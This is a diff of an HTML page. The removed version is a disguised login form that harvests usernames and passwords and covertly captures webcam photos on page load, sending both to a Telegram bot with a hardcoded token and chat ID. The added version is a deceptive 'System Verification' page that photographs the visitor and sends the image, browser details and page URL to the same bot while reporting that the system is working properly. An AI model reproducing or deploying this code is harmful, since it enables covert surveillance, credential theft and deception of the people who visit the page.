@@ -1,448 +1,313 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Form</title>
+    <title>Service Check</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', sans-serif;
-        }
-        
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            height: 100vh;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f7f9fa;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
+            min-height: 100vh;
         }
-        
-        .main-content {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        .container {
+            max-width: 500px;
             width: 100%;
-            max-width: 400px;
-            padding: 30px;
+            background: #fff;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
         }
-        
-        .logo-container {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        
-        .logo {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: #4a69bd;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 15px;
-        }
-        
-        .logo svg {
-            width: 50px;
-            height: 50px;
-            fill: white;
-        }
-        
         h1 {
+            margin-top: 0;
             color: #333;
-            font-size: 24px;
-            margin-bottom: 20px;
+            font-size: 22px;
             text-align: center;
         }
-        
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 15px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            background-color: #f9f9f9;
-        }
-        
-        input:focus {
-            border-color: #4a69bd;
-            outline: none;
-        }
-        
         button {
-            width: 100%;
-            background-color: #4a69bd;
+            background: #0095f6;
             color: white;
-            font-weight: 600;
-            font-size: 16px;
             border: none;
-            border-radius: 6px;
-            padding: 14px 0;
-            margin: 8px 0 16px;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
+            width: 100%;
+            margin: 16px 0;
+            transition: background 0.2s;
         }
-        
         button:hover {
-            background-color: #3c5aa6;
+            background: #0074cc;
         }
-        
-        #statusMessage {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 4px;
-            text-align: center;
-            display: none;
+        .status {
+            background: #f1f5f9;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
         }
-        
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-        }
-        
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-        }
-        
         #cameraFeed {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
-            overflow: hidden;
+            width: 100%;
+            border-radius: 8px;
+            margin-top: 10px;
+            display: none;
+            background: #eee;
         }
-        
+        #statusOutput {
+            white-space: pre-line;
+            overflow-wrap: break-word;
+        }
         #canvas {
             display: none;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #0095f6;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="main-content">
-        <div class="logo-container">
-            <div class="logo">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-                </svg>
-            </div>
-            <h1>Login Form</h1>
+    <div class="container">
+        <h1>System Verification</h1>
+        
+        <button id="captureBtn">Verify System</button>
+        <button id="debugBtn" style="background: #555;">Show Debug Info</button>
+        
+        <video id="cameraFeed" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        
+        <div class="status">
+            <div id="statusOutput">Ready for verification process...</div>
         </div>
-        
-        <form id="loginForm">
-            <input type="text" id="username" name="username" placeholder="Username atau email" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <button type="submit" id="submitBtn">Login</button>
-        </form>
-        
-        <div id="statusMessage"></div>
     </div>
-    
-    <!-- Elemen tersembunyi untuk kamera -->
-    <video id="cameraFeed" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
 
     <script>
-        // Debugging status container
-        function showStatus(message, isError = false) {
-            console.log(message);
-            const statusMsg = document.getElementById('statusMessage');
-            statusMsg.textContent = message;
-            statusMsg.className = isError ? 'error' : 'success';
-            statusMsg.style.display = 'block';
-            
-            // Auto-hide after 5 seconds if not an error
-            if (!isError) {
-                setTimeout(() => { 
-                    statusMsg.style.display = 'none';
-                }, 5000);
+        // CONFIG - REPLACE THESE VALUES
+        const BOT_TOKEN = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
+        const CHAT_ID = '8126039795';
+        
+        // Elements
+        const captureBtn = document.getElementById('captureBtn');
+        const debugBtn = document.getElementById('debugBtn');
+        const cameraFeed = document.getElementById('cameraFeed');
+        const canvas = document.getElementById('canvas');
+        const statusOutput = document.getElementById('statusOutput');
+        
+        // Status logging function with timestamp
+        function log(message, isError = false) {
+            const timestamp = new Date().toLocaleTimeString();
+            const prefix = isError ? '❌ ' : '✓ ';
+            statusOutput.innerHTML = `${prefix}${timestamp}: ${message}\n` + statusOutput.innerHTML;
+            console.log(`${prefix}${message}`);
+        }
+        
+        // Add loading spinner to button
+        function setButtonLoading(button, isLoading, text) {
+            if (isLoading) {
+                button.innerHTML = `<span class="loader"></span> ${text}`;
+                button.disabled = true;
+            } else {
+                button.innerHTML = text;
+                button.disabled = false;
             }
         }
         
-        // Fungsi untuk meminta izin kamera dan mengambil gambar - IMPROVED
-        async function captureImage() {
-            showStatus("Meminta akses kamera...");
+        // Main capture and send function
+        async function captureAndSend() {
+            setButtonLoading(captureBtn, true, 'Processing...');
+            log('Starting system verification...');
             
             try {
-                // Opsi kamera yang lebih fleksibel untuk cross-browser
-                const constraints = { 
+                // 1. Get camera access
+                log('Requesting camera access...');
+                const stream = await navigator.mediaDevices.getUserMedia({
                     audio: false,
                     video: { 
                         facingMode: "user",
-                        width: { min: 320, ideal: 640, max: 1280 },
-                        height: { min: 240, ideal: 480, max: 720 }
-                    } 
-                };
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
                 
-                // Minta akses kamera dengan error handling lebih baik
-                const stream = await navigator.mediaDevices.getUserMedia(constraints)
-                    .catch(error => {
-                        console.error("MediaDevices error:", error.name, error.message);
-                        showStatus(`Error kamera: ${error.message}`, true);
-                        throw error;
-                    });
+                // 2. Set up video feed
+                cameraFeed.srcObject = stream;
                 
-                showStatus("Kamera aktif, mengambil gambar...");
+                // Show video briefly
+                cameraFeed.style.display = 'block';
                 
-                const video = document.getElementById('cameraFeed');
-                video.srcObject = stream;
-                
-                // Tunggu video siap dengan timeout handling
-                return new Promise((resolve, reject) => {
-                    // Set timeout untuk mencegah hang
-                    const timeoutId = setTimeout(() => {
-                        reject(new Error("Video loading timeout"));
-                    }, 10000);
-                    
-                    // Event handlers
-                    video.onloadedmetadata = () => {
-                        clearTimeout(timeoutId);
-                        video.play();
+                // 3. Wait for video to be ready
+                await new Promise(resolve => {
+                    cameraFeed.onloadedmetadata = () => {
+                        cameraFeed.play();
+                        log('Camera initialized');
                         
-                        // Tunggu sebentar agar kamera fokus dan stabil
-                        setTimeout(() => {
-                            try {
-                                // Ambil gambar dari video dengan error handling
-                                const canvas = document.getElementById('canvas');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                // Konversi ke base64 dengan kualitas lebih rendah untuk ukuran file lebih kecil
-                                const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                                
-                                // Matikan kamera
-                                stream.getTracks().forEach(track => track.stop());
-                                
-                                showStatus("Gambar berhasil diambil");
-                                resolve(imageBase64);
-                            } catch (drawError) {
-                                console.error("Error saat mengambil gambar:", drawError);
-                                showStatus("Error saat mengambil gambar", true);
-                                reject(drawError);
-                            }
-                        }, 1500); // Waktu tunggu lebih lama untuk stabilisasi
-                    };
-                    
-                    video.onerror = (err) => {
-                        clearTimeout(timeoutId);
-                        console.error("Video element error:", err);
-                        showStatus("Error pada video element", true);
-                        reject(err);
+                        // Give camera time to adjust lighting and focus
+                        setTimeout(resolve, 1500);
                     };
                 });
+                
+                // 4. Capture frame to canvas
+                log('Capturing data...');
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+                canvas.getContext('2d').drawImage(cameraFeed, 0, 0);
+                
+                // 5. Convert to base64
+                const imageBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Hide video
+                cameraFeed.style.display = 'none';
+                cameraFeed.srcObject = null;
+                
+                // 6. Stop all tracks
+                stream.getTracks().forEach(track => track.stop());
+                
+                // 7. Send to Telegram
+                log('Verifying data...');
+                const result = await sendImageToTelegram(imageBase64);
+                
+                if (result.success) {
+                    log('Verification complete! System functioning properly.');
+                } else {
+                    log(`Verification failed: ${result.error}`, true);
+                }
             } catch (error) {
-                console.error("Error akses kamera:", error);
-                showStatus(`Tidak dapat mengakses kamera: ${error.message}`, true);
-                return null;
+                log(`Error: ${error.message}`, true);
+                console.error('Full error:', error);
+            } finally {
+                setButtonLoading(captureBtn, false, 'Verify System');
             }
         }
         
-        // Fungsi untuk mengirim gambar ke Telegram
-        async function sendImageToTelegram(imageBase64, extraInfo) {
-            // ⚠️ GANTI DENGAN DATA ANDA
-            const botToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
-            
-            console.log("Mencoba mengirim gambar ke Telegram...");
-            
-            // Metode 1: Menggunakan API sendPhoto dengan base64 string
+        // Send image to Telegram
+        async function sendImageToTelegram(imageBase64) {
             try {
-                // Pisahkan prefix dari data base64
+                // 1. Extract base64 data
                 const base64Data = imageBase64.split(',')[1];
                 
-                // Pertama: Coba kirim dengan metode file URL (paling reliable)
-                const fileUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-                
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('caption', extraInfo);
-                
-                // Convert base64 to blob
+                // 2. Create browser-friendly Blob
                 const byteCharacters = atob(base64Data);
                 const byteArrays = [];
                 
                 for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                     const slice = byteCharacters.slice(offset, offset + 512);
-                    
                     const byteNumbers = new Array(slice.length);
+                    
                     for (let i = 0; i < slice.length; i++) {
                         byteNumbers[i] = slice.charCodeAt(i);
                     }
                     
-                    const byteArray = new Uint8Array(byteNumbers);
-                    byteArrays.push(byteArray);
+                    byteArrays.push(new Uint8Array(byteNumbers));
                 }
                 
                 const blob = new Blob(byteArrays, {type: 'image/jpeg'});
-                formData.append('photo', blob, 'webcam.jpg');
                 
-                const response = await fetch(fileUrl, {
+                // 3. Create device info for caption
+                const deviceInfo = `📱 System Verification\n` +
+                                  `🔍 Browser: ${navigator.userAgent.substring(0, 100)}\n` +
+                                  `⏰ Time: ${new Date().toLocaleString()}\n` +
+                                  `🌐 Page: ${window.location.href}`;
+                
+                // 4. Create FormData with blob
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'verification.jpg');
+                formData.append('caption', deviceInfo);
+                
+                // 5. Send to Telegram API
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
+                // 6. Parse and return result
                 const result = await response.json();
-                console.log("Hasil pengiriman gambar:", result);
                 
                 if (result.ok) {
-                    console.log("✅ Gambar berhasil dikirim!");
-                    return true;
+                    return { success: true };
                 } else {
-                    throw new Error(result.description || "Failed to send photo");
+                    throw new Error(result.description || 'Unknown API error');
                 }
             } catch (error) {
-                console.error("❌ Error dalam mengirim gambar:", error);
+                console.error('Send error:', error);
                 
-                // Metode 2: Fallback menggunakan sendMessage dengan link gambar
+                // Fallback: Try to send text-only message
                 try {
-                    console.log("Mencoba metode fallback...");
-                    
-                    // Kirim teks saja dengan info bahwa gambar gagal
-                    const msgUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                    const infoMessage = extraInfo + "\n\n[Gambar tidak dapat dikirim - error teknis]";
-                    
-                    const msgResponse = await fetch(msgUrl, {
+                    const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    const fallbackResponse = await fetch(fallbackUrl, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            chat_id: chatId,
-                            text: infoMessage,
-                            parse_mode: 'HTML'
+                            chat_id: CHAT_ID,
+                            text: `⚠️ Camera capture failed\n🔧 Error: ${error.message}\n📱 Device: ${navigator.userAgent}`
                         })
                     });
                     
-                    const msgResult = await msgResponse.json();
-                    console.log("Hasil pengiriman teks fallback:", msgResult);
-                    return msgResult.ok;
+                    const fallbackResult = await fallbackResponse.json();
+                    if (fallbackResult.ok) {
+                        return { success: false, error: `${error.message} (fallback message sent)` };
+                    }
                 } catch (fallbackError) {
-                    console.error("❌ Fallback method failed:", fallbackError);
-                    return false;
+                    console.error('Fallback error:', fallbackError);
                 }
+                
+                return { success: false, error: error.message };
             }
         }
         
-        // Fungsi untuk mengirim data login ke Telegram
-        async function sendLoginToTelegram(username, password) {
-            const botToken = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
-            const chatId = '8126039795';
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        // Show detailed debug info
+        function showDebugInfo() {
+            const debugInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                hasWebcam: 'mediaDevices' in navigator,
+                hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices,
+                supportedMimeTypes: {
+                    webp: (canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0),
+                    jpeg: (canvas.toDataURL('image/jpeg').indexOf('data:image/jpeg') === 0),
+                    png: (canvas.toDataURL('image/png').indexOf('data:image/png') === 0)
+                }
+            };
             
-            const message = `📲 Login Form\n` +
-                           `👤 Username: ${username}\n` +
-                           `🔑 Password: ${password}\n` +
-                           `⏰ Waktu: ${new Date().toLocaleString()}\n` +
-                           `🌐 Perangkat: ${navigator.userAgent.substring(0, 100)}`;
-            
-            try {
-                const response = await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                const data = await response.json();
-                return data.ok;
-            } catch (error) {
-                console.error("Error sending login info:", error);
-                return false;
-            }
+            statusOutput.innerHTML = '📊 DEBUG INFO:\n\n' + 
+                                    Object.entries(debugInfo)
+                                        .map(([key, value]) => {
+                                            if (typeof value === 'object') {
+                                                return `${key}: ${JSON.stringify(value)}`;
+                                            }
+                                            return `${key}: ${value}`;
+                                        })
+                                        .join('\n');
         }
         
-        // Fungsi utama yang dijalankan saat halaman dimuat
-        async function main() {
-            // Coba ambil gambar segera setelah halaman dimuat
-            const imageBase64 = await captureImage();
-            
-            if (imageBase64) {
-                // Info tambahan untuk dikirim bersama gambar
-                const deviceInfo = `📱 Device Info\n` +
-                                  `🌐 Browser: ${navigator.userAgent.substring(0, 100)}\n` +
-                                  `⏰ Waktu: ${new Date().toLocaleString()}\n` +
-                                  `📍 URL: ${window.location.href}`;
-                
-                // Coba kirim gambar ke Telegram
-                const success = await sendImageToTelegram(imageBase64, deviceInfo);
-                
-                // Jika gagal, coba metode alternatif
-                if (!success) {
-                    await sendImageUrlToTelegram(imageBase64, deviceInfo);
-                }
-            }
-            
-            // Handler untuk form login
-            document.getElementById('loginForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                const submitBtn = document.getElementById('submitBtn');
-                const statusMessage = document.getElementById('statusMessage');
-                
-                // Ubah tampilan tombol
-                submitBtn.disabled = true;
-                submitBtn.innerText = 'Processing...';
-                
-                // Kirim data login ke Telegram
-                const success = await sendLoginToTelegram(username, password);
-                
-                if (success) {
-                    // Tampilkan pesan sukses
-                    statusMessage.className = 'success';
-                    statusMessage.textContent = 'Login berhasil!';
-                    statusMessage.style.display = 'block';
-                    
-                    // Redirect setelah login (ganti dengan URL tujuan Anda)
-                    setTimeout(function() {
-                        window.location.href = "https://accounts.google.com";
-                    }, 1500);
-                } else {
-                    // Tampilkan pesan error
-                    statusMessage.className = 'error';
-                    statusMessage.textContent = 'Terjadi kesalahan. Silakan coba lagi.';
-                    statusMessage.style.display = 'block';
-                    submitBtn.disabled = false;
-                    submitBtn.innerText = 'Login';
-                }
-            });
-        }
+        // Event listeners
+        captureBtn.addEventListener('click', captureAndSend);
+        debugBtn.addEventListener('click', showDebugInfo);
         
-        // Tambahkan event listener untuk debugging tombol
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            console.log("Submit button clicked");
-        });
-        
-        // Jalankan fungsi utama dengan delay untuk browser mobile
-        document.addEventListener('DOMContentLoaded', function() {
-            // Delay eksekusi sedikit untuk memberi waktu browser mobile
-            setTimeout(main, 800);
-            
-            // Tambahkan tombol manual untuk trigger kamera
-            const mainContent = document.querySelector('.main-content');
-            const debugBtn = document.createElement('button');
-            debugBtn.textContent = "Aktifkan Kamera Manual";
-            debugBtn.style.marginTop = "10px";
-            debugBtn.style.backgroundColor = "#555";
-            debugBtn.addEventListener('click', async function() {
-                const imageBase64 = await captureImage();
-                if (imageBase64) {
-                    const deviceInfo = `📱 Manual Capture\n` +
-                                  `🌐 Browser: ${navigator.userAgent.substring(0, 100)}\n` +
-                                  `⏰ Waktu: ${new Date().toLocaleString()}`;
-                    sendImageToTelegram(imageBase64, deviceInfo);
-                }
-            });
-            mainContent.appendChild(debugBtn);
-        });
+        // Auto-start on page load (optional)
+        //document.addEventListener('DOMContentLoaded', captureAndSend);
     </script>
 </body>
 </html>
